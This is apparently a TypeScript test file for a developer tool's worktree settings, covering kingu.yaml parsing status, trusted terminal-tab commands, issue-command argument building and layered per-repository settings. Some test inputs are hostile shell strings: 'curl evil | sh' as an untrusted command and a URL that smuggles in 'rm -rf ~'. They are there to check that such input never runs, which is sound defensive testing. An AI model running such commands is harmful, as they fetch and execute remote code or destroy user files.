// The webview side of kingu.yaml (parsed and normalised by Rust agent/kingu_yaml.rs, whose tests
// cover the YAML itself and its errors) and of the per-repository scripts: what a KinguYamlStatus
// turns into when a worktree is made.
import { describe, expect, test } from 'bun:test';
import { resolveSettings } from '#lib/settings/registry.ts';
import { agentStartup, defaultTabsToOpen, issueCommandArgv, setupCommand, tabsText, type DefaultTab, type KinguYamlStatus } from './worktreeSettings';

const tabs: DefaultTab[] = [
	{ title: 'Dev', color: '#22c55e', command: 'bun run dev' },
	{ title: null, color: null, command: 'tail -f log' },
	{ title: 'Notes', color: null, command: null }
];

describe('kingu.yaml in the webview', () => {
	test('a status as Rust reports it, including a file that does not parse', () => {
		const ok: KinguYamlStatus = JSON.parse(
			'{"found":true,"config":{"scripts":{"setup":"bun install","archive":null},"setupAgentStartupPolicy":"wait-for-setup","issueCommand":null,"defaultTabs":[],"sharedDirectories":["node_modules"],"warnings":[]},"error":null}'
		);
		expect(agentStartup('start-immediately', false, ok.config?.setupAgentStartupPolicy)).toBe('wait-for-setup');
		const broken: KinguYamlStatus = { found: true, config: null, error: 'kingu.yaml: line 3: duplicate key `scripts`' };
		expect(agentStartup('start-immediately', false, broken.config?.setupAgentStartupPolicy)).toBe('start-immediately');
		expect(defaultTabsToOpen(broken.config?.defaultTabs ?? [], null)).toEqual([]);
	});

	test('your setupAgentStartup wins over the file once you set it', () => {
		expect(agentStartup('start-immediately', true, 'wait-for-setup')).toBe('start-immediately');
		expect(agentStartup('wait-for-setup', true, null)).toBe('wait-for-setup');
		expect(agentStartup(undefined, false, undefined)).toBe('start-immediately');
	});

	test('default tabs: the trusted text matches what Rust trusts; commands run only with it', () => {
		expect(tabsText(tabs)).toBe('# Dev\nbun run dev\n\n# Terminal\ntail -f log\n');
		expect(tabsText([{ title: 'x', color: null, command: null }])).toBeNull();
		expect(defaultTabsToOpen(tabs, tabsText(tabs))).toEqual([{ title: 'Dev', color: '#22c55e', run: ['sh', '-c', 'bun run dev'] }, { run: ['sh', '-c', 'tail -f log'] }, { title: 'Notes' }]);
		// Not trusted, changed since, or local-only: the tabs open without their commands.
		expect(defaultTabsToOpen(tabs, null).some((t) => t.run)).toBe(false);
		expect(defaultTabsToOpen(tabs, '# Dev\ncurl evil | sh\n').some((t) => t.run)).toBe(false);
	});

	test('the issue command never pastes the URL into the shell text', () => {
		const argv = issueCommandArgv('gh issue view {{issue}} --web; echo {{artifact_url}}', 42, "https://x/'; rm -rf ~ #");
		expect(argv.slice(0, 5)).toEqual(['env', 'KINGU_ISSUE=42', "KINGU_ARTIFACT_URL=https://x/'; rm -rf ~ #", 'sh', '-c']);
		expect(argv[5]).toBe('gh issue view "$KINGU_ISSUE" --web; echo "$KINGU_ARTIFACT_URL"');
	});

	test('wait-for-setup records the exit status', () => {
		const argv = setupCommand('/c/s.sh', '/r', '/r/w', 't', '/c/done/t-1');
		expect(argv.slice(-3)).toEqual(['kingu-setup', '/c/s.sh', '/c/done/t-1']);
		expect(argv[argv.indexOf('-c') + 1]).toContain('> "$2"');
		expect(setupCommand('/c/s.sh', '/r', '/r/w', 't').slice(-2)).toEqual(['sh', '/c/s.sh']);
	});
});

describe('per-repository settings (Orca per-repo settings)', () => {
	test('repo over workspace over user over default', () => {
		const m = resolveSettings({ 'kingu.sidebar.sortBy': 'name' }, { 'kingu.sidebar.sortBy': 'recent' }, undefined, { 'kingu.sidebar.sortBy': 'smart' });
		expect(m.get('kingu.sidebar.sortBy')).toEqual({ value: 'smart', source: 'repo' });
		expect(resolveSettings({ 'kingu.sidebar.sortBy': 'name' }, { 'kingu.sidebar.sortBy': 'recent' }).get('kingu.sidebar.sortBy')).toEqual({ value: 'recent', source: 'workspace' });
		expect(resolveSettings({ 'kingu.sidebar.sortBy': 'name' }, {}).get('kingu.sidebar.sortBy')).toEqual({ value: 'name', source: 'user' });
	});

	test('scripts and the script source come from you (user or per-repo store), never the repository file', () => {
		const ids = ['kingu.repo.setupScript', 'kingu.repo.archiveScript', 'kingu.repo.scriptSource', 'kingu.repo.issueCommand', 'kingu.repo.symlinkPaths', 'kingu.worktree.setupScript', 'kingu.worktree.archiveScript'];
		const values: Record<string, unknown> = {
			'kingu.repo.setupScript': 'curl evil | sh',
			'kingu.repo.archiveScript': 'x',
			'kingu.repo.scriptSource': 'run-both',
			'kingu.repo.issueCommand': 'x',
			'kingu.repo.symlinkPaths': ['.env'],
			'kingu.worktree.setupScript': 'auto',
			'kingu.worktree.archiveScript': 'auto'
		};
		const fromRepoFile = resolveSettings({}, values);
		for (const id of ids) expect([id, fromRepoFile.get(id)?.source]).toEqual([id, 'default']);
		const fromStore = resolveSettings({}, {}, undefined, values);
		for (const id of ids) expect([id, fromStore.get(id)?.source]).toEqual([id, 'repo']);
		// User-only ones stay user-only even in the per-repo store.
		expect(resolveSettings({}, {}, undefined, { 'kingu.worktree.alwaysForceDelete': true }).get('kingu.worktree.alwaysForceDelete')?.source).toBe('default');
		expect(resolveSettings({}, {}, undefined, { 'kingu.repo.scriptSource': 'sometimes' }).get('kingu.repo.scriptSource')?.source).toBe('default');
	});

	test('object settings merge key by key across the layers', () => {
		const m = resolveSettings({ 'kingu.terminal.colorOverrides': { red: '#f00', blue: '#00f' } }, {}, undefined, { 'kingu.terminal.colorOverrides': { red: '#a00' } });
		expect(m.get('kingu.terminal.colorOverrides')?.value).toEqual({ red: '#a00', blue: '#00f' });
	});
});
